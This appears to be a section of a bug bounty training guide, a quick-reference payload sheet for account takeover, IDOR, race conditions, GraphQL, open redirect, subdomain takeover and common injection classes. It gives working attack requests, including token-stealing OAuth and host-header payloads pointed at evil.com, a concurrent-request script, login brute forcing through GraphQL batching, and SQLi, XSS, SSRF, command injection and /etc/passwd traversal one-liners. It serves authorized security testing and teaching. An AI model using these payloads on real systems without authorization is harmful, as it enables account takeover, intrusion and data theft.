# 08 — Bug Bounty: Payloads

> Quick-reference payloads optimized for bug bounty hunting scenarios.

> 📋 **What You Will Do In This Section**
> - [ ] Test for account takeover via host header poisoning and OAuth flaws
> - [ ] Hunt IDORs with sequential IDs, UUIDs, and method-based techniques
> - [ ] Exploit race conditions with concurrent requests
> - [ ] Discover GraphQL schema via introspection and bypass rate limiting
> - [ ] Detect subdomain takeover opportunities

---

## 🔴 Account Takeover Payloads

> 💡 **Why This Matters**
> Account takeover is consistently the highest-paying vulnerability class. Average ATO bounty: $5,000+. These payloads target the password reset flow, OAuth, and session management — where most ATO bugs live.

```http
# Password reset → Host header poisoning
POST /forgot-password HTTP/1.1
Host: evil.com
Content-Type: application/json

{"email": "victim@target.com"}
# If reset link uses Host header: https://evil.com/reset?token=abc123

# Also try:
X-Forwarded-Host: evil.com
X-Host: evil.com
Forwarded: host=evil.com

# OAuth redirect_uri manipulation
GET /oauth/authorize?client_id=xxx&redirect_uri=https://evil.com/callback&response_type=code
GET /oauth/authorize?client_id=xxx&redirect_uri=https://target.com.evil.com/callback
GET /oauth/authorize?client_id=xxx&redirect_uri=https://target.com/callback/../../../evil.com
GET /oauth/authorize?client_id=xxx&redirect_uri=https://target.com/callback%23@evil.com
```

---

## 🔴 IDOR Payloads

> 💡 **Why This Matters**
> IDOR is the most common high-paying vulnerability. Test EVERY endpoint that uses an ID parameter — sequential numbers, UUIDs, encoded strings. Each is a potential $1,000+ finding.

```
# Sequential IDs
/api/users/1
/api/users/2
/api/users/3

# UUID manipulation
/api/users/550e8400-e29b-41d4-a716-446655440000
# Try: variant UUIDs from other endpoints

# Method-based IDOR (one method blocked, another isn't)
GET /api/users/other_id          # Might be blocked
PUT /api/users/other_id          # Might work!
DELETE /api/users/other_id       # Might work!
PATCH /api/users/other_id        # Might work!

# Parameter pollution
/api/users?id=my_id&id=other_id
/api/users?id[]=my_id&id[]=other_id

# Encoded IDs
/api/users/BASE64_ENCODED_ID     # Decode, modify, re-encode
/api/users/HASHED_ID              # Check if hash is predictable
```

#### 🧪 Try It Now — IDOR Quick Test (Juice Shop)

```bash
echo "=== IDOR Testing on Juice Shop ==="
echo ""
echo "1. Login and get your token:"
echo '   curl -s http://localhost:3000/rest/user/login -H "Content-Type: application/json" -d '\''{"email":"admin@juice-sh.op","password":"admin123"}'\'' | jq .authentication.token'
echo ""
echo "2. Test basket IDOR:"
echo '   for i in $(seq 1 10); do echo "Basket $i:"; curl -s http://localhost:3000/rest/basket/$i -H "Authorization: Bearer TOKEN" | jq .data.id 2>/dev/null; done'
echo ""
echo "3. Test user IDOR:"
echo '   for i in $(seq 1 5); do echo "User $i:"; curl -s http://localhost:3000/api/Users/$i -H "Authorization: Bearer TOKEN" | jq .data.email 2>/dev/null; done'
```

---

## 🔴 Race Condition Payloads

> 💡 **Why This Matters**
> Race conditions exploit TOCTOU (time-of-check vs time-of-use) bugs. Send 20 requests simultaneously — if the server doesn't lock properly, you can apply a discount twice, transfer money multiple times, or vote more than once.

```python
import requests
import threading

url = "https://target.com/api/apply-coupon"
headers = {"Authorization": "Bearer TOKEN"}
data = {"code": "DISCOUNT50"}

def send():
    requests.post(url, json=data, headers=headers)

# Send 20 requests simultaneously
threads = [threading.Thread(target=send) for _ in range(20)]
for t in threads:
    t.start()
for t in threads:
    t.join()

# Test for:
# - Apply discount code multiple times
# - Transfer money from same balance multiple times
# - Create account with same email multiple times
# - Redeem reward/voucher multiple times
```

---

## 🔴 GraphQL Payloads

> 💡 **Why This Matters**
> GraphQL endpoints often expose more data than intended. Introspection reveals the entire API schema, batch queries bypass rate limiting, and nested queries can cause DoS.

```json
// Introspection query (discover ALL types and fields)
{"query": "{__schema{types{name fields{name type{name}}}}}"}

// IDOR via GraphQL
{"query": "{ user(id: 1) { email phone ssn } }"}
{"query": "{ user(id: 2) { email phone ssn } }"}

// Batch queries (bypass rate limiting on login)
[
  {"query": "mutation { login(username: \"admin\", password: \"pass1\") { token } }"},
  {"query": "mutation { login(username: \"admin\", password: \"pass2\") { token } }"},
  {"query": "mutation { login(username: \"admin\", password: \"pass3\") { token } }"}
]

// Injection in GraphQL
{"query": "{ user(name: \"admin' OR 1=1--\") { id email } }"}
```

---

## 🔴 Open Redirect Payloads

```
# Basic
/redirect?url=https://evil.com
/redirect?url=//evil.com
/redirect?url=/\evil.com

# Bypass with allowed domain
/redirect?url=https://evil.com?target.com
/redirect?url=https://target.com@evil.com
/redirect?url=https://target.com.evil.com

# Encoded
/redirect?url=https%3A%2F%2Fevil.com
/redirect?url=%2F%2Fevil.com
/redirect?url=%252F%252Fevil.com   # Double encode
```

---

## 🔴 Subdomain Takeover Indicators

> 💡 **Why This Matters**
> If a CNAME points to a service that no longer exists, you can claim that service and control the subdomain. This is a reliable $500-2,000 finding.

```
# CNAME → Error message → Takeover possible?
GitHub Pages:  "There isn't a GitHub Pages site here" → YES
Heroku:        "No such app" → YES
AWS S3:        "NoSuchBucket" → YES
Shopify:       "Sorry, this shop is currently unavailable" → YES
Azure:         "404 Web Site not found" → YES
Fastly:        "Fastly error: unknown domain" → YES
Zendesk:       "Help Center Closed" → YES

# Check: dig CNAME subdomain.target.com
# If CNAME exists but service returns error → potential takeover
```

---

## 🔴 Quick Payloads Cheatsheet

```
SQLi:        ' OR 1=1-- -
XSS:         <img src=x onerror=alert(document.domain)>
SSRF:        http://169.254.169.254/latest/meta-data/
SSTI:        {{7*7}}
CMDi:        ; id
Path:        ../../etc/passwd
IDOR:        Change ID in URL/body with different user's session
CORS:        Origin: https://evil.com (check Access-Control-Allow-Origin)
CRLF:        %0d%0aInjected-Header: value
Open Redir:  ?url=//evil.com
JWT None:    Change alg to "none", remove signature
```

---

## 📋 Per-Endpoint Testing Checklist

```
For EACH endpoint discovered:
□ IDOR (change resource IDs with different user's session)
□ SQL injection (single quote, UNION, SLEEP)
□ XSS (reflected in response? stored for other users?)
□ SSRF (if URL parameter exists)
□ Authentication bypass (access without auth token)
□ CORS misconfiguration (check with evil.com Origin)
□ Rate limiting (can you brute force?)
□ Mass assignment (add extra parameters: isAdmin=true)
□ Business logic (price manipulation, skip steps)
□ Race conditions (parallel requests on state-changing ops)
□ GraphQL introspection (if GraphQL endpoint)
□ Open redirect (if redirect parameter exists)
□ CSRF (if state-changing without anti-CSRF token)
```

---

## 🧠 If You're Stuck

1. **Payloads all filtered**: Try encoding (URL, double-URL, Unicode), case variation, and alternative characters
2. **IDOR returns 403**: Try different HTTP methods (PUT, PATCH, DELETE). Try adding extra headers.
3. **GraphQL introspection disabled**: Try partial queries: `{__type(name:"User"){fields{name}}}`
4. **Race condition doesn't work**: Increase simultaneous threads. Use Burp Intruder with "Pitchfork" mode.
5. **Subdomain takeover CNAME gone**: Someone else claimed it already. Move to the next one.
